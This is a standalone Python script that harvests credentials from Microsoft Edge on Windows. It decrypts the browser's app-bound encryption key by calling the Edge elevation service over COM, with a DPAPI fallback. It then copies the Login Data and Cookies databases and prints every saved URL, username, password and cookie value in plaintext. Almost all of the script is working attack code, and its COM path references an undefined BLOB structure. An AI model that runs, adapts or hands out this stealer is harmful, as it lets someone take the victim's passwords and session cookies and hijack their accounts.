#!/usr/bin/env python3
import json, base64, os, sqlite3, shutil, tempfile, ctypes
from ctypes import wintypes, c_uint32, c_void_p, POINTER, byref, c_void_p as LPVOID
from Crypto.Cipher import AES
import comtypes
from comtypes import GUID

# Edge elevation service CLSID
CLSID = GUID("{1FCBE96C-1697-43AF-9140-2897C7C69767}")
# IElevatorEdge IID
IID = GUID("{C9C2B807-7731-4F34-81B7-44FF7779522B}")

ole32 = ctypes.oledll.ole32

def com_init():
    hr = ole32.CoInitialize(None)
    return hr

def com_create():
    """Create COM object, return raw interface pointer."""
    p = ctypes.c_void_p()
    hr = ole32.CoCreateInstance(
        byref(CLSID), None, 4,  # CLSCTX_LOCAL_SERVER
        byref(IID), byref(p)
    )
    if hr != 0:
        raise OSError(f"CoCreateInstance: 0x{hr & 0xFFFFFFFF:08X}")
    return p

def com_decrypt(obj_ptr, data):
    """Call DecryptData (vtable slot 5) on COM object."""
    # Read vtable pointer from object
    vtbl_ptr = ctypes.cast(obj_ptr, POINTER(LPVOID)).contents
    vtbl = ctypes.cast(vtbl_ptr, POINTER(LPVOID))
    
    # DecryptData = slot 5 (QI=0, AddRef=1, Release=2, RunRecovery=3, Encrypt=4, Decrypt=5)
    decrypt_addr = vtbl[5]
    
    # Prototype: HRESULT (this, BLOB* in, BLOB* out, DWORD* err)
    proto = ctypes.WINFUNCTYPE(
        ctypes.HRESULT,
        LPVOID,              # this
        ctypes.POINTER(BLOB),  # input blob
        ctypes.POINTER(BLOB),  # output blob
        POINTER(wintypes.DWORD)  # last error
    )
    
    func = proto(decrypt_addr)
    
    # Prepare BLOBs
    buf = ctypes.create_string_buffer(data)
    in_blob = BLOB()
    in_blob.cbData = len(data)
    in_blob.pbData = ctypes.cast(buf, c_void_p)
    
    out_blob = BLOB()
    out_blob.cbData = 0
    out_blob.pbData = None
    
    err = wintypes.DWORD()
    
    # Call: func(this, &in, &out, &err) — this passed implicitly via rcx on x64
    hr = func(obj_ptr, byref(in_blob), byref(out_blob), byref(err))
    
    if hr != 0:
        raise OSError(f"DecryptData: 0x{hr & 0xFFFFFFFF:08X} err={err.value}")
    if out_blob.cbData == 0:
        raise ValueError("empty result")
    
    return ctypes.string_at(out_blob.pbData, out_blob.cbData)

def dpapi_unprotect(data):
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", c_uint32), ("pbData", ctypes.c_char_p)]
    crypt32 = ctypes.windll.crypt32
    inp = DATA_BLOB()
    inp.cbData = len(data)
    inp.pbData = ctypes.create_string_buffer(data)
    out = DATA_BLOB()
    ret = crypt32.CryptUnprotectData(byref(inp), None, None, None, None, 0, byref(out))
    if not ret:
        raise OSError(f"DPAPI: {ctypes.GetLastError()}")
    result = ctypes.string_at(out.pbData, out.cbData)
    ctypes.windll.kernel32.LocalFree(out.pbData)
    return result

def decrypt_pw(blob, key):
    if not blob or len(blob) < 3:
        return None
    ver = blob[:3]
    if ver in (b'v10', b'v11'):
        nonce, ct = blob[3:15], blob[15:]
        return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct[:-16], ct[-16:]).decode('utf-8', errors='replace')
    elif ver == b'v20':
        payload = blob[3:]
        nonce, ct = payload[:12], payload[12:]
        return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct[:-16], ct[-16:]).decode('utf-8', errors='replace')
    return None

def main():
    com_init()
    profile = os.environ.get('USERPROFILE', 'C:\\Users\\admin')
    edge = os.path.join(profile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
    
    # Read Local State
    with open(os.path.join(edge, 'Local State'), 'r', encoding='utf-8') as f:
        ls = json.load(f)
    osc = ls.get('os_crypt', {})
    
    aes_key = None
    source = "none"
    
    # Try v20 via IElevator COM
    ab_b64 = osc.get('app_bound_encrypted_key', '')
    if ab_b64:
        ab = base64.b64decode(ab_b64)
        blob = ab[4:]  # strip APPB
        
        print(f"[*] COM object + DecryptData ({len(blob)} bytes)...")
        try:
            obj = com_create()
            print(f"[+] COM object: {obj}")
            aes_key = com_decrypt(obj, blob)
            source = "IElevator COM"
            print(f"[+] AES key: {aes_key.hex()}")
        except Exception as e:
            print(f"[-] IElevator: {e}")
    
    # Fallback: v10 key via user DPAPI
    if not aes_key:
        ek = osc.get('encrypted_key', '')
        if ek:
            eb = base64.b64decode(ek)
            aes_key = dpapi_unprotect(eb[5:])
            source = "v10 DPAPI"
            print(f"[+] v10 key: {aes_key.hex()}")
    
    if not aes_key:
        print("[-] no key"); return
    
    # Dump passwords
    login_db = os.path.join(edge, 'Default', 'Login Data')
    tmp = os.path.join(tempfile.gettempdir(), f"ld_{os.getpid()}")
    shutil.copy2(login_db, tmp)
    conn = sqlite3.connect(tmp)
    c = conn.cursor()
    c.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created DESC")
    
    print(f"\n{'='*80}")
    print(f"PASSWORDS (key: {source})")
    for url, user, pw_blob in c.fetchall():
        if pw_blob:
            try: pw = decrypt_pw(pw_blob, aes_key)
            except Exception as e: pw = f"<err>"
        else: pw = None
        print(f"{(url or '?'):<50} {(user or '?'):<30} {pw}")
    
    # Dump cookies
    ck_path = os.path.join(edge, 'Default', 'Network', 'Cookies')
    if os.path.exists(ck_path):
        shutil.copy2(ck_path, tmp)
        conn2 = sqlite3.connect(tmp)
        c2 = conn2.cursor()
        c2.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value) > 3")
        print(f"\nCOOKIES:")
        for host, name, enc in c2.fetchall():
            try:
                val = decrypt_pw(enc, aes_key)
                if val: print(f"  {host:40s} {name:25s} = {val[:50]}")
            except: pass
        conn2.close()
    
    conn.close()
    os.remove(tmp)
    print("\n[+] done")

if __name__ == '__main__':
    main()